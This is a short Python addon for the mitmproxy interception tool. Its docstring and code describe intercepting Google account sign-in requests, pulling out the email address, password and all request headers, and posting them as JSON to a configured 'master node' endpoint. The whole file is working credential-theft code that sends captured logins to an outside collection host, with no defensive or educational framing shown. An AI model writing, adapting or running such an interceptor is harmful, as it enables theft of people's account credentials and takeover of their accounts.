import requests
import json
import settings as s
from mitmproxy import http
"""
Usage: mitmproxy -s ./mitm-gogo.py

Addon that identify when credentials are being sent to google.com
Collects them and send them to a master node
Information sent:
-Credentials
-Headers

"""


def request(flow: http.HTTPFlow) -> None:
    head = {}
    if flow.request.pretty_url == "https://accounts.google.com/signin/v2/challenge/password/empty":
        email = flow.request.urlencoded_form['identifier']
        password = flow.request.urlencoded_form['password']
        headers = flow.request.headers.fields  # List of tuples type binary
        # Make a dictionary with the headers for the request
        for tuple in headers:
            head[tuple[0].decode('utf-8')] = tuple[1].decode('utf-8')
        response = requests.post(s.POST_ENDPOINT, data=json.dumps(
            {'email': email, 'password': password, 'headers': head}))
